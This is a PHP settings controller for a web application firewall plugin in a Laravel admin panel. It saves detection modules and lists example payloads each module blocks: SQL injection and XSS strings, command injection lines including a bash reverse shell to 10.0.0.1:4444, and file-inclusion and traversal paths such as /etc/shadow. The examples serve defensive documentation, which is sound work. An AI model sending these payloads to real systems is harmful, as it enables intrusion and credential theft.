<?php

namespace LaveroAdmin\Admin\Wafu\Controllers;

use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Routing\Controller;
use LaveroAdmin\Admin\Facades\Admin;
use LaveroAdmin\Admin\Layout\Content;
use LaveroAdmin\Admin\Wafu\Models\WafuSetting;
use LaveroAdmin\Admin\Wafu\Services\WafuService;
use LaveroAdmin\Admin\Widgets\Box;

class WafuSettingsController extends Controller
{
    public function index(): Content
    {
        return Admin::content(function (Content $content) {
            $content->title(trans('lavero-admin-wafu::wafu.settings'));
            $content->description(trans('lavero-admin-wafu::wafu.settings_desc'));

            $settings = [
                'enabled'                 => WafuService::isEnabled(),
                'mode'                    => WafuService::getMode(),
                'trust_forwarded_headers' => WafuService::toBool(WafuSetting::get('trust_forwarded_headers', config('wafu.trust_forwarded_headers', false))),
                'trusted_proxies'         => (string) WafuSetting::get('trusted_proxies', implode("\n", (array) config('wafu.trusted_proxies', []))),
                'whitelisted_ips'         => (string) WafuSetting::get('whitelisted_ips', ''),
                'excluded_routes'         => (string) WafuSetting::get('excluded_routes', ''),
                'ignored_fields'          => (string) WafuSetting::get('ignored_fields', implode(', ', (array) config('wafu.ignored_fields', []))),
                'sensitive_fields'        => (string) WafuSetting::get('sensitive_fields', implode(', ', (array) config('wafu.sensitive_fields', []))),

                // Modules
                'mod_sql_injection'       => WafuService::isModuleEnabled('sql_injection'),
                'mod_xss'                 => WafuService::isModuleEnabled('xss'),
                'mod_rce'                 => WafuService::isModuleEnabled('rce'),
                'mod_lfi'                 => WafuService::isModuleEnabled('lfi'),
                'mod_path_traversal'      => WafuService::isModuleEnabled('path_traversal'),
                'mod_bad_bots'            => WafuService::isModuleEnabled('bad_bots'),
                'mod_rate_limit'          => WafuService::isModuleEnabled('rate_limit'),
                'mod_not_found_abuse'     => WafuService::isModuleEnabled('not_found_abuse'),
                'mod_ip_blocklist'        => WafuService::isModuleEnabled('ip_blocklist'),

                // Rate limit & 404 abuse rules
                'rate_limit_limit'        => (int) WafuSetting::get('rate_limit_limit', config('wafu.modules.rate_limit.limit', 120)),
                'rate_limit_interval'     => (int) WafuSetting::get('rate_limit_interval', config('wafu.modules.rate_limit.interval', 60)),
                'rate_limit_key_by'       => (string) WafuSetting::get('rate_limit_key_by', config('wafu.modules.rate_limit.key_by', 'ip')),
                'rate_limit_action'       => (string) WafuSetting::get('rate_limit_action', config('wafu.modules.rate_limit.on_exceed', 'challenge')),

                'not_found_threshold'     => (int) WafuSetting::get('not_found_threshold', config('wafu.modules.not_found_abuse.threshold', 20)),
                'not_found_interval'      => (int) WafuSetting::get('not_found_interval', config('wafu.modules.not_found_abuse.interval', 300)),
                'not_found_key_by'        => (string) WafuSetting::get('not_found_key_by', config('wafu.modules.not_found_abuse.key_by', 'ip')),
                'not_found_action'        => (string) WafuSetting::get('not_found_action', config('wafu.modules.not_found_abuse.on_exceed', 'block')),
            ];

            $moduleDefaults = [
                'sql_injection'  => ['action' => 'block', 'targets' => ['query', 'body', 'cookies']],
                'xss'            => ['action' => 'block', 'targets' => ['query', 'body', 'cookies']],
                'rce'            => ['action' => 'block', 'targets' => ['query', 'body', 'cookies', 'uri']],
                'lfi'            => ['action' => 'block', 'targets' => ['query', 'body', 'cookies', 'uri']],
                'path_traversal' => ['action' => 'block', 'targets' => ['uri', 'query', 'body', 'cookies']],
                'bad_bots'       => ['action' => 'challenge', 'targets' => []],
            ];

            foreach ($moduleDefaults as $mod => $def) {
                $settings["mod_{$mod}_action"] = (string) WafuSetting::get(
                    "mod_{$mod}_action",
                    config("wafu.modules.{$mod}.on_match", $def['action'])
                );
                $settings["mod_{$mod}_targets"] = (array) WafuSetting::get(
                    "mod_{$mod}_targets",
                    config("wafu.modules.{$mod}.targets", $def['targets'])
                );
                $settings["mod_{$mod}_custom_patterns"] = (string) WafuSetting::get("mod_{$mod}_custom_patterns", '');
            }

            $ruleset = $this->loadRuleset();
            $modulesData = $this->buildModulesData($ruleset, $settings);

            $formHtml = view('lavero-admin-wafu::settings', compact('settings', 'modulesData'))->render();
            $box = new Box(trans('lavero-admin-wafu::wafu.configuration'), $formHtml);

            $content->body($box);
        });
    }

    protected function loadRuleset(): ?array
    {
        $possiblePaths = [
            base_path('vendor/bespredel/wafu/ruleset.json'),
            __DIR__ . '/../../../../../../vendor/bespredel/wafu/ruleset.json',
        ];

        foreach ($possiblePaths as $path) {
            if (file_exists($path)) {
                $content = @file_get_contents($path);
                if ($content) {
                    $json = @json_decode($content, true);
                    if (is_array($json)) {
                        return $json;
                    }
                }
            }
        }

        return null;
    }

    protected function buildModulesData(?array $ruleset, array $settings): array
    {
        $patterns = $ruleset['config']['patterns'] ?? [];

        return [
            'sql_injection' => [
                'setting_key'   => 'mod_sql_injection',
                'title'         => trans('lavero-admin-wafu::wafu.mod_sqli'),
                'description'   => trans('lavero-admin-wafu::wafu.mod_sqli_desc'),
                'icon'          => 'icon-database',
                'color'         => 'danger',
                'action'        => 'Block (HTTP 403 Forbidden)',
                'action_type'   => 'block',
                'targets'       => ['GET (Query string)', 'POST (Request body / JSON)', 'Cookies'],
                'enabled'       => !empty($settings['mod_sql_injection']),
                'patterns'      => $patterns['sql_keywords'] ?? [],
                'pattern_count' => count($patterns['sql_keywords'] ?? []),
                'examples'      => [
                    "?id=1' OR '1'='1",
                    "user=admin'--",
                    "id=1 UNION SELECT 1,username,password FROM users--",
                    "cat=books; SLEEP(5)",
                    "field=1 AND 1=1 UNION ALL SELECT null, table_name FROM information_schema.tables--",
                ],
            ],
            'xss' => [
                'setting_key'   => 'mod_xss',
                'title'         => trans('lavero-admin-wafu::wafu.mod_xss'),
                'description'   => trans('lavero-admin-wafu::wafu.mod_xss_desc'),
                'icon'          => 'icon-code',
                'color'         => 'warning',
                'action'        => 'Block (HTTP 403 Forbidden)',
                'action_type'   => 'block',
                'targets'       => ['GET (Query string)', 'POST (Request body / JSON)', 'Cookies'],
                'enabled'       => !empty($settings['mod_xss']),
                'patterns'      => $patterns['xss_basic'] ?? [],
                'pattern_count' => count($patterns['xss_basic'] ?? []),
                'examples'      => [
                    "<script>alert('XSS')</script>",
                    "javascript:alert(document.cookie)",
                    "<img src=x onerror=alert(1)>",
                    "<svg onload=alert(document.domain)>",
                    "<iframe src='javascript:alert(1)'>",
                ],
            ],
            'rce' => [
                'setting_key'   => 'mod_rce',
                'title'         => trans('lavero-admin-wafu::wafu.mod_rce'),
                'description'   => trans('lavero-admin-wafu::wafu.mod_rce_desc'),
                'icon'          => 'icon-terminal',
                'color'         => 'danger',
                'action'        => 'Block (HTTP 403 Forbidden)',
                'action_type'   => 'block',
                'targets'       => ['GET (Query string)', 'POST (Request body)', 'Cookies', 'URI'],
                'enabled'       => !empty($settings['mod_rce']),
                'patterns'      => $patterns['rce_signatures'] ?? [],
                'pattern_count' => count($patterns['rce_signatures'] ?? []),
                'examples'      => [
                    "; cat /etc/passwd",
                    "| bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                    "&& whoami",
                    "`id`",
                    "\$(uname -a)",
                    "python -c 'import pty; pty.spawn(\"/bin/sh\")'",
                    "powershell -enc ...",
                ],
            ],
            'lfi' => [
                'setting_key'   => 'mod_lfi',
                'title'         => trans('lavero-admin-wafu::wafu.mod_lfi'),
                'description'   => trans('lavero-admin-wafu::wafu.mod_lfi_desc'),
                'icon'          => 'icon-file-alt',
                'color'         => 'warning',
                'action'        => 'Block (HTTP 403 Forbidden)',
                'action_type'   => 'block',
                'targets'       => ['GET (Query string)', 'POST (Request body)', 'Cookies', 'URI'],
                'enabled'       => !empty($settings['mod_lfi']),
                'patterns'      => $patterns['lfi_files'] ?? [],
                'pattern_count' => count($patterns['lfi_files'] ?? []),
                'examples'      => [
                    "/etc/passwd",
                    "/etc/shadow",
                    "/proc/self/environ",
                    "php://filter/convert.base64-encode/resource=index.php",
                    "expect://id",
                    "data://text/plain;base64,...",
                    ".env",
                ],
            ],
            'path_traversal' => [
                'setting_key'   => 'mod_path_traversal',
                'title'         => trans('lavero-admin-wafu::wafu.mod_traversal'),
                'description'   => trans('lavero-admin-wafu::wafu.mod_traversal_desc'),
                'icon'          => 'icon-folder-open',
                'color'         => 'warning',
                'action'        => 'Block (HTTP 403 Forbidden)',
                'action_type'   => 'block',
                'targets'       => ['URI', 'GET (Query string)', 'POST (Request body)', 'Cookies'],
                'enabled'       => !empty($settings['mod_path_traversal']),
                'patterns'      => $patterns['path_traversal'] ?? [],
                'pattern_count' => count($patterns['path_traversal'] ?? []),
                'examples'      => [
                    "../../../../etc/passwd",
                    "..\\..\\windows\\win.ini",
                    "%2e%2e%2f%2e%2e%2f",
                    "%252e%252e%252f",
                    "%c0%ae%c0%ae/",
                ],
            ],
            'bad_bots' => [
                'setting_key'   => 'mod_bad_bots',
                'title'         => trans('lavero-admin-wafu::wafu.mod_bad_bots'),
                'description'   => trans('lavero-admin-wafu::wafu.mod_bad_bots_desc'),
                'icon'          => 'icon-robot',
                'color'         => 'info',
                'action'        => 'Challenge (HTTP 429) / Block',
                'action_type'   => 'challenge',
                'targets'       => ['User-Agent (HTTP Header)'],
                'enabled'       => !empty($settings['mod_bad_bots']),
                'patterns'      => $patterns['bad_bots_ua'] ?? [],
                'pattern_count' => count($patterns['bad_bots_ua'] ?? []),
                'examples'      => [
                    "sqlmap/1.6#stable",
                    "Nikto/2.1.6",
                    "curl/7.88.1",
                    "Wget/1.21.3",
                    "python-requests/2.28",
                    "masscan/1.0",
                    "Nmap Scripting Engine",
                ],
            ],
            'ip_blocklist' => [
                'setting_key'   => 'mod_ip_blocklist',
                'title'         => trans('lavero-admin-wafu::wafu.mod_ip_blocklist'),
                'description'   => trans('lavero-admin-wafu::wafu.mod_ip_blocklist_desc'),
                'icon'          => 'icon-ban',
                'color'         => 'dark',
                'action'        => 'Instant Block (HTTP 403 Forbidden)',
                'action_type'   => 'block',
                'targets'       => ['Client IP Address (IPv4, IPv6, CIDR subnets)'],
                'enabled'       => !empty($settings['mod_ip_blocklist']),
                'patterns'      => [
                    'Local blocked IP cache lookup (wafu_blocks table)',
                    'Single IPv4/IPv6 and CIDR subnet masks (192.168.1.0/24)',
                    'Automatic IP blocklist insertion upon repeated threats',
                ],
                'pattern_count' => 'IP Blocklist',
                'examples'      => [
                    '192.168.1.105 (manual permanent block)',
                    '10.0.0.0/16 (subnet range block)',
                    'Temporary 24h ban for exploit attempt',
                ],
            ],
            'rate_limit' => [
                'setting_key'   => 'mod_rate_limit',
                'title'         => trans('lavero-admin-wafu::wafu.mod_rate_limit'),
                'description'   => trans('lavero-admin-wafu::wafu.mod_rate_limit_desc'),
                'icon'          => 'icon-tachometer-alt',
                'color'         => 'primary',
                'action'        => 'Challenge (HTTP 429 Too Many Requests)',
                'action_type'   => 'challenge',
                'targets'       => ['Incoming request rate from Client IP'],
                'enabled'       => !empty($settings['mod_rate_limit']),
                'patterns'      => [
                    'Algorithm: Sliding Window Counter',
                    "Threshold: maximum {$settings['rate_limit_limit']} requests per {$settings['rate_limit_interval']} seconds interval",
                    "Group by: {$settings['rate_limit_key_by']} | Action: {$settings['rate_limit_action']}",
                ],
                'pattern_count' => "{$settings['rate_limit_limit']} req / {$settings['rate_limit_interval']}s",
                'examples'      => [
                    'Automated mitigation of DDoS and DoS attacks',
                    'Brute-force protection on authentication endpoints',
                    'Prevention of high-speed web scraping and crawling',
                ],
            ],
            'not_found_abuse' => [
                'setting_key'   => 'mod_not_found_abuse',
                'title'         => trans('lavero-admin-wafu::wafu.mod_not_found_abuse'),
                'description'   => trans('lavero-admin-wafu::wafu.mod_not_found_abuse_desc'),
                'icon'          => 'icon-search',
                'color'         => 'secondary',
                'action'        => 'Block (HTTP 403 Forbidden)',
                'action_type'   => 'block',
                'targets'       => ['HTTP 404 Response Count per Client IP'],
                'enabled'       => !empty($settings['mod_not_found_abuse']),
                'patterns'      => [
                    "Error threshold: more than {$settings['not_found_threshold']} 404 Not Found responses",
                    "Time interval: {$settings['not_found_interval']} seconds",
                    "Group by: {$settings['not_found_key_by']} | Action: {$settings['not_found_action']}",
                ],
                'pattern_count' => ">{$settings['not_found_threshold']} 404 / {$settings['not_found_interval']}s",
                'examples'      => [
                    'Scanning for hidden admin panels: /admin.php, /wp-login.php',
                    'Scanning for archive and database dumps: /backup.zip, /dump.sql, /.git',
                    'Automated directory fuzzing tools (dirbuster, gobuster)',
                ],
            ],
        ];
    }

    public function save(Request $request): RedirectResponse
    {
        WafuSetting::set('enabled', $request->has('enabled'));
        WafuSetting::set('mode', $request->input('mode', 'enforce') === 'report' ? 'report' : 'enforce');
        WafuSetting::set('trust_forwarded_headers', $request->has('trust_forwarded_headers'));
        WafuSetting::set('trusted_proxies', (string) $request->input('trusted_proxies', ''));
        WafuSetting::set('whitelisted_ips', (string) $request->input('whitelisted_ips', ''));
        WafuSetting::set('excluded_routes', (string) $request->input('excluded_routes', ''));
        WafuSetting::set('ignored_fields', (string) $request->input('ignored_fields', ''));
        WafuSetting::set('sensitive_fields', (string) $request->input('sensitive_fields', ''));

        $modules = [
            'mod_sql_injection',
            'mod_xss',
            'mod_rce',
            'mod_lfi',
            'mod_path_traversal',
            'mod_bad_bots',
            'mod_rate_limit',
            'mod_not_found_abuse',
            'mod_ip_blocklist',
        ];

        foreach ($modules as $mod) {
            WafuSetting::set($mod, $request->has($mod));
        }

        $validActions = ['block', 'challenge', 'log'];
        $validTargets = ['query', 'body', 'cookies', 'uri', 'headers'];

        foreach (['sql_injection', 'xss', 'rce', 'lfi', 'path_traversal', 'bad_bots'] as $mod) {
            $action = (string) $request->input("mod_{$mod}_action", 'block');
            WafuSetting::set("mod_{$mod}_action", in_array($action, $validActions, true) ? $action : 'block');

            if ($mod !== 'bad_bots') {
                $targets = array_values(array_intersect(
                    (array) $request->input("mod_{$mod}_targets", []),
                    $validTargets
                ));
                WafuSetting::set("mod_{$mod}_targets", $targets);
            }

            WafuSetting::set("mod_{$mod}_custom_patterns", (string) $request->input("mod_{$mod}_custom_patterns", ''));
        }

        WafuSetting::set('rate_limit_limit', max(1, (int) $request->input('rate_limit_limit', 120)));
        WafuSetting::set('rate_limit_interval', max(1, (int) $request->input('rate_limit_interval', 60)));
        $rlKeyBy = (string) $request->input('rate_limit_key_by', 'ip');
        WafuSetting::set('rate_limit_key_by', in_array($rlKeyBy, ['ip', 'ip+uri'], true) ? $rlKeyBy : 'ip');
        $rlAction = (string) $request->input('rate_limit_action', 'challenge');
        WafuSetting::set('rate_limit_action', in_array($rlAction, $validActions, true) ? $rlAction : 'challenge');

        WafuSetting::set('not_found_threshold', max(1, (int) $request->input('not_found_threshold', 20)));
        WafuSetting::set('not_found_interval', max(1, (int) $request->input('not_found_interval', 300)));
        $nfKeyBy = (string) $request->input('not_found_key_by', 'ip');
        WafuSetting::set('not_found_key_by', in_array($nfKeyBy, ['ip', 'ip+uri'], true) ? $nfKeyBy : 'ip');
        $nfAction = (string) $request->input('not_found_action', 'block');
        WafuSetting::set('not_found_action', in_array($nfAction, $validActions, true) ? $nfAction : 'block');

        admin_toastr(trans('lavero-admin-wafu::wafu.saved_successfully'), 'success');

        return redirect()->route('wafu.settings');
    }
}
